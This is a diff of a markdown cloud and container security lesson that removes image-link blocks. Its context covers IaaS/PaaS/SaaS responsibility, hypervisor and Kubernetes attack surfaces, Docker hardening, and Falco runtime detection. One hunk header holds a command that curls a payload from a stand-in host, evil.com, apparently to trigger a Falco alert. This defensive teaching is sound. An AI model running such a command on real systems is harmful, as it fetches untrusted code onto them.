@@ -98,16 +98,6 @@ flowchart LR
 
 ### 1. Infrastructure as a Service (IaaS)
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/1-infrastructure-as-a-service-iaas-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/1-infrastructure-as-a-service-iaas-handwritten.svg" alt="Handwritten: 1. Infrastructure as a Service (IaaS)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/1-infrastructure-as-a-service-iaas-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/1-infrastructure-as-a-service-iaas-diagram.svg" alt="Diagram: 1. Infrastructure as a Service (IaaS)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/1-infrastructure-as-a-service-iaas-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/1-infrastructure-as-a-service-iaas-sticky.svg" alt="Sticky Note: 1. Infrastructure as a Service (IaaS)" width="30%">
-</a>
-
 **Analogy:** Renting an apartment — the landlord provides the building shell and plumbing (hypervisor, hardware, network). You bring your own furniture, paint the walls, and fix your leaky faucet (OS, middleware, apps, data).
 
 **What YOU secure:** Applications, data, runtime, OS, middleware, network config (security groups, ACLs).
@@ -123,16 +113,6 @@ aws ec2 authorize-security-group-ingress --group-name web-sg --protocol tcp --po
 
 ### 2. Platform as a Service (PaaS)
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/2-platform-as-a-service-paas-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/2-platform-as-a-service-paas-handwritten.svg" alt="Handwritten: 2. Platform as a Service (PaaS)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/2-platform-as-a-service-paas-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/2-platform-as-a-service-paas-diagram.svg" alt="Diagram: 2. Platform as a Service (PaaS)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/2-platform-as-a-service-paas-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/2-platform-as-a-service-paas-sticky.svg" alt="Sticky Note: 2. Platform as a Service (PaaS)" width="30%">
-</a>
-
 **Analogy:** Renting a fully furnished apartment — the landlord provides furniture, appliances, and utilities. You just bring your clothes and cook your food (your application code and data).
 
 **What YOU secure:** Application code, data, access configuration (IAM, secrets).
@@ -147,32 +127,12 @@ aws elasticbeanstalk create-environment --application-name my-app --environment-
 
 ### 3. Software as a Service (SaaS)
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/3-software-as-a-service-saas-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/3-software-as-a-service-saas-handwritten.svg" alt="Handwritten: 3. Software as a Service (SaaS)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/3-software-as-a-service-saas-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/3-software-as-a-service-saas-diagram.svg" alt="Diagram: 3. Software as a Service (SaaS)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/3-software-as-a-service-saas-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/3-software-as-a-service-saas-sticky.svg" alt="Sticky Note: 3. Software as a Service (SaaS)" width="30%">
-</a>
-
 **Analogy:** Staying at a hotel — everything is provided. You just use the service. You're responsible for keeping your room locked (your data, user accounts, access policies).
 
 **What YOU secure:** Data classification, user access management (IAM), client-side security.
 **What provider secures:** Everything below data — application, runtime, OS, middleware, hardware, networking.
 
 ### Responsibility Comparison Table
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/responsibility-comparison-table-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/responsibility-comparison-table-handwritten.svg" alt="Handwritten: Responsibility Comparison Table" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/responsibility-comparison-table-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/responsibility-comparison-table-diagram.svg" alt="Diagram: Responsibility Comparison Table" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/responsibility-comparison-table-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/responsibility-comparison-table-sticky.svg" alt="Sticky Note: Responsibility Comparison Table" width="30%">
-</a>
 
 
 | Resource | On-Premises | IaaS | PaaS | SaaS |
@@ -202,16 +162,6 @@ Complexity: O(1) — direct classification
 
 ### Edge Cases
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/edge-cases-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/edge-cases-handwritten.svg" alt="Handwritten: Edge Cases" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/edge-cases-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/edge-cases-diagram.svg" alt="Diagram: Edge Cases" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/edge-cases-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/edge-cases-sticky.svg" alt="Sticky Note: Edge Cases" width="30%">
-</a>
-
 - **Container services (EKS, AKS, GKE):** Hybrid model — provider secures control plane, customer secures worker nodes, pods, and container runtime. Responsibility boundary is at the Kubernetes API server.
 - **Serverless (Lambda, Functions):** Provider secures execution environment, customer secures function code, dependencies, and IAM permissions. Cold-start containers are provider-managed.
 - **Shared VPC (GCP Hosted Projects):** Host project owner secures networking, service project owner secures resources. Split responsibility model.
@@ -221,16 +171,6 @@ Complexity: O(1) — direct classification
 ## Cloud Shared Responsibility Model
 
 ### Deep Dive — The Six Layers of Cloud Security
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/deep-dive-the-six-layers-of-cloud-security-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/deep-dive-the-six-layers-of-cloud-security-handwritten.svg" alt="Handwritten: Deep Dive — The Six Layers of Cloud Security" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/deep-dive-the-six-layers-of-cloud-security-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/deep-dive-the-six-layers-of-cloud-security-diagram.svg" alt="Diagram: Deep Dive — The Six Layers of Cloud Security" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/deep-dive-the-six-layers-of-cloud-security-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/deep-dive-the-six-layers-of-cloud-security-sticky.svg" alt="Sticky Note: Deep Dive — The Six Layers of Cloud Security" width="30%">
-</a>
 
 
 ```
@@ -296,30 +236,10 @@ Layer 6: Governance & Compliance (shared)
 
 ### Hypervisor-Based Virtualization
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/hypervisor-based-virtualization-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/hypervisor-based-virtualization-handwritten.svg" alt="Handwritten: Hypervisor-Based Virtualization" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/hypervisor-based-virtualization-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/hypervisor-based-virtualization-diagram.svg" alt="Diagram: Hypervisor-Based Virtualization" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/hypervisor-based-virtualization-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/hypervisor-based-virtualization-sticky.svg" alt="Sticky Note: Hypervisor-Based Virtualization" width="30%">
-</a>
-
 
 **Analogy:** An apartment building with a super-strict landlord. The hypervisor is the landlord who ensures tenants (VMs) stay in their own apartments and don't peek into each other's windows. If the landlord goes rogue or gets compromised, every apartment is exposed.
 
 ### Hypervisor Attack Surfaces
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/hypervisor-attack-surfaces-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/hypervisor-attack-surfaces-handwritten.svg" alt="Handwritten: Hypervisor Attack Surfaces" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/hypervisor-attack-surfaces-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/hypervisor-attack-surfaces-diagram.svg" alt="Diagram: Hypervisor Attack Surfaces" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/hypervisor-attack-surfaces-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/hypervisor-attack-surfaces-sticky.svg" alt="Sticky Note: Hypervisor Attack Surfaces" width="30%">
-</a>
 
 
 | Attack Type | Description | Real-World Example |
@@ -331,16 +251,6 @@ Layer 6: Governance & Compliance (shared)
 | VM Hopping | Guest accesses another guest via shared memory | Memory deduplication attacks |
 
 ### VM Escape — Detailed Walkthrough
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/vm-escape-detailed-walkthrough-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/vm-escape-detailed-walkthrough-handwritten.svg" alt="Handwritten: VM Escape — Detailed Walkthrough" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/vm-escape-detailed-walkthrough-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/vm-escape-detailed-walkthrough-diagram.svg" alt="Diagram: VM Escape — Detailed Walkthrough" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/vm-escape-detailed-walkthrough-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/vm-escape-detailed-walkthrough-sticky.svg" alt="Sticky Note: VM Escape — Detailed Walkthrough" width="30%">
-</a>
 
 
 **Step-by-Step Attack Flow:**
@@ -378,16 +288,6 @@ function attemptVmEscape():
 
 ### VM Sprawl Security Risks
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/vm-sprawl-security-risks-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/vm-sprawl-security-risks-handwritten.svg" alt="Handwritten: VM Sprawl Security Risks" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/vm-sprawl-security-risks-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/vm-sprawl-security-risks-diagram.svg" alt="Diagram: VM Sprawl Security Risks" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/vm-sprawl-security-risks-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/vm-sprawl-security-risks-sticky.svg" alt="Sticky Note: VM Sprawl Security Risks" width="30%">
-</a>
-
 
 | Risk | Impact | Mitigation |
 |------|--------|-----------|
@@ -404,16 +304,6 @@ function attemptVmEscape():
 
 ### A&D Table — Virtualization Security
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/a-d-table-virtualization-security-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/a-d-table-virtualization-security-handwritten.svg" alt="Handwritten: A&D Table — Virtualization Security" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/a-d-table-virtualization-security-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/a-d-table-virtualization-security-diagram.svg" alt="Diagram: A&D Table — Virtualization Security" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/a-d-table-virtualization-security-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/a-d-table-virtualization-security-sticky.svg" alt="Sticky Note: A&D Table — Virtualization Security" width="30%">
-</a>
-
 
 | Aspect | Advantages | Disadvantages |
 |--------|-----------|---------------|
@@ -428,30 +318,10 @@ function attemptVmEscape():
 
 ### Docker Security
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/docker-security-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/docker-security-handwritten.svg" alt="Handwritten: Docker Security" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/docker-security-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/docker-security-diagram.svg" alt="Diagram: Docker Security" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/docker-security-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/docker-security-sticky.svg" alt="Sticky Note: Docker Security" width="30%">
-</a>
-
 
 **Analogy:** Shipping containers in a port. Each container is sealed and isolated, but they all sit on the same ship (host kernel). If you leave your container unlocked or put dangerous cargo inside (insecure images, secrets in ENV), the entire ship is at risk.
 
 ### Docker Security Best Practices
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/docker-security-best-practices-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/docker-security-best-practices-handwritten.svg" alt="Handwritten: Docker Security Best Practices" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/docker-security-best-practices-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/docker-security-best-practices-diagram.svg" alt="Diagram: Docker Security Best Practices" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/docker-security-best-practices-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/docker-security-best-practices-sticky.svg" alt="Sticky Note: Docker Security Best Practices" width="30%">
-</a>
 
 
 | Practice | Description | Command/Config |
@@ -506,16 +376,6 @@ docker run --pid=host --net=host --cap-add=audit_control \
 
 ### Trivy Container Image Scanning
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/trivy-container-image-scanning-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/trivy-container-image-scanning-handwritten.svg" alt="Handwritten: Trivy Container Image Scanning" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/trivy-container-image-scanning-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/trivy-container-image-scanning-diagram.svg" alt="Diagram: Trivy Container Image Scanning" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/trivy-container-image-scanning-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/trivy-container-image-scanning-sticky.svg" alt="Sticky Note: Trivy Container Image Scanning" width="30%">
-</a>
-
 
 ```bash
 # Install Trivy (Windows)
@@ -550,16 +410,6 @@ Output: 2 CRITICAL, 1 HIGH vulnerability found
 
 ### Docker Security — Edge Cases
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/docker-security-edge-cases-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/docker-security-edge-cases-handwritten.svg" alt="Handwritten: Docker Security — Edge Cases" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/docker-security-edge-cases-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/docker-security-edge-cases-diagram.svg" alt="Diagram: Docker Security — Edge Cases" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/docker-security-edge-cases-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/docker-security-edge-cases-sticky.svg" alt="Sticky Note: Docker Security — Edge Cases" width="30%">
-</a>
-
 
 - **Rootless Docker (dockerd-rootless):** Docker daemon runs without root privileges. Prevents daemon compromise from escalating to host root. Requires cgroup v2 and specific configuration.
 - **User namespace remapping:** Maps container root (UID 0) to a non-privileged host UID. Effective against container escape via UID 0 exploitation.
@@ -574,16 +424,6 @@ Output: 2 CRITICAL, 1 HIGH vulnerability found
 
 ### Kubernetes Attack Surface
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/kubernetes-attack-surface-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/kubernetes-attack-surface-handwritten.svg" alt="Handwritten: Kubernetes Attack Surface" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/kubernetes-attack-surface-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/kubernetes-attack-surface-diagram.svg" alt="Diagram: Kubernetes Attack Surface" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/kubernetes-attack-surface-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/kubernetes-attack-surface-sticky.svg" alt="Sticky Note: Kubernetes Attack Surface" width="30%">
-</a>
-
 
 | Component | Attack Vector | Mitigation |
 |-----------|--------------|------------|
@@ -597,16 +437,6 @@ Output: 2 CRITICAL, 1 HIGH vulnerability found
 | Admission control | Unvalidated pod specs | OPA/Gatekeeper, Kyverno |
 
 ### RBAC (Role-Based Access Control)
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/rbac-role-based-access-control-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/rbac-role-based-access-control-handwritten.svg" alt="Handwritten: RBAC (Role-Based Access Control)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/rbac-role-based-access-control-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/rbac-role-based-access-control-diagram.svg" alt="Diagram: RBAC (Role-Based Access Control)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/rbac-role-based-access-control-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/rbac-role-based-access-control-sticky.svg" alt="Sticky Note: RBAC (Role-Based Access Control)" width="30%">
-</a>
 
 
 **Pseudocode — RBAC Configuration Pattern:**
@@ -648,16 +478,6 @@ kubectl create clusterrolebinding readonly-binding --clusterrole=readonly --user
 
 ### Pod Security Standards (PSS)
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/pod-security-standards-pss-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/pod-security-standards-pss-handwritten.svg" alt="Handwritten: Pod Security Standards (PSS)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/pod-security-standards-pss-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/pod-security-standards-pss-diagram.svg" alt="Diagram: Pod Security Standards (PSS)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/pod-security-standards-pss-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/pod-security-standards-pss-sticky.svg" alt="Sticky Note: Pod Security Standards (PSS)" width="30%">
-</a>
-
 
 Three levels of pod security:
 
@@ -693,16 +513,6 @@ Input: Pod spec requesting privileged=true, hostPID=true
 ```
 
 ### Network Policies
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/network-policies-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/network-policies-handwritten.svg" alt="Handwritten: Network Policies" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/network-policies-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/network-policies-diagram.svg" alt="Diagram: Network Policies" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/network-policies-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/network-policies-sticky.svg" alt="Sticky Note: Network Policies" width="30%">
-</a>
 
 
 ```yaml
@@ -747,16 +557,6 @@ kubectl run test --image=alpine --rm -it -- wget -qO- http://backend-svc.product
 - **Convergence time:** Seconds (iptables rules updated on each node)
 
 ### Secrets Management
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/secrets-management-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/secrets-management-handwritten.svg" alt="Handwritten: Secrets Management" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/secrets-management-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/secrets-management-diagram.svg" alt="Diagram: Secrets Management" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/secrets-management-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/secrets-management-sticky.svg" alt="Sticky Note: Secrets Management" width="30%">
-</a>
 
 
 ```bash
@@ -803,16 +603,6 @@ spec:
 
 ### Admission Controllers
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/admission-controllers-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/admission-controllers-handwritten.svg" alt="Handwritten: Admission Controllers" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/admission-controllers-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/admission-controllers-diagram.svg" alt="Diagram: Admission Controllers" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/admission-controllers-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/admission-controllers-sticky.svg" alt="Sticky Note: Admission Controllers" width="30%">
-</a>
-
 
 | Controller | Function | Example |
 |-----------|----------|---------|
@@ -849,16 +639,6 @@ kubectl get validatingwebhookconfigurations gatekeeper-validating-webhook-config
 
 ### kube-bench CIS Benchmark
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/kube-bench-cis-benchmark-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/kube-bench-cis-benchmark-handwritten.svg" alt="Handwritten: kube-bench CIS Benchmark" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/kube-bench-cis-benchmark-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/kube-bench-cis-benchmark-diagram.svg" alt="Diagram: kube-bench CIS Benchmark" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/kube-bench-cis-benchmark-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/kube-bench-cis-benchmark-sticky.svg" alt="Sticky Note: kube-bench CIS Benchmark" width="30%">
-</a>
-
 
 ```bash
 # Run kube-bench against your cluster
@@ -877,16 +657,6 @@ kubectl run kube-bench --image=aquasec/kube-bench:latest --restart=Never -- node
 ```
 
 ### Falco Runtime Security
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/falco-runtime-security-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/falco-runtime-security-handwritten.svg" alt="Handwritten: Falco Runtime Security" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/falco-runtime-security-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/falco-runtime-security-diagram.svg" alt="Diagram: Falco Runtime Security" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/falco-runtime-security-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/falco-runtime-security-sticky.svg" alt="Sticky Note: Falco Runtime Security" width="30%">
-</a>
 
 
 **Analogy:** A security guard watching every door, window, and hallway in real-time. Falco monitors system calls from the kernel and alerts on suspicious behavior — like someone trying to open the server room door at 3 AM.
@@ -952,16 +722,6 @@ docker run --rm -it alpine sh -c "apk add curl && curl http://evil.com/payload"
 
 ### A&D Table — Container Security
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/a-d-table-container-security-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/a-d-table-container-security-handwritten.svg" alt="Handwritten: A&D Table — Container Security" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/a-d-table-container-security-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/a-d-table-container-security-diagram.svg" alt="Diagram: A&D Table — Container Security" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/a-d-table-container-security-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/a-d-table-container-security-sticky.svg" alt="Sticky Note: A&D Table — Container Security" width="30%">
-</a>
-
 
 | Aspect | Advantages | Disadvantages |
 |--------|-----------|---------------|
@@ -981,16 +741,6 @@ docker run --rm -it alpine sh -c "apk add curl && curl http://evil.com/payload"
 
 ### How Serverless Changes the Security Model
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/how-serverless-changes-the-security-model-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/how-serverless-changes-the-security-model-handwritten.svg" alt="Handwritten: How Serverless Changes the Security Model" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/how-serverless-changes-the-security-model-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/how-serverless-changes-the-security-model-diagram.svg" alt="Diagram: How Serverless Changes the Security Model" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/how-serverless-changes-the-security-model-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/how-serverless-changes-the-security-model-sticky.svg" alt="Sticky Note: How Serverless Changes the Security Model" width="30%">
-</a>
-
 
 | Traditional Security | Serverless Security |
 |---------------------|---------------------|
@@ -1002,16 +752,6 @@ docker run --rm -it alpine sh -c "apk add curl && curl http://evil.com/payload"
 | IP-based access control | Event source-based access control |
 
 ### OWASP Serverless Top 10
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/owasp-serverless-top-10-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/owasp-serverless-top-10-handwritten.svg" alt="Handwritten: OWASP Serverless Top 10" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/owasp-serverless-top-10-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/owasp-serverless-top-10-diagram.svg" alt="Diagram: OWASP Serverless Top 10" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/owasp-serverless-top-10-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/owasp-serverless-top-10-sticky.svg" alt="Sticky Note: OWASP Serverless Top 10" width="30%">
-</a>
 
 
 | Rank | Vulnerability | Description | Mitigation |
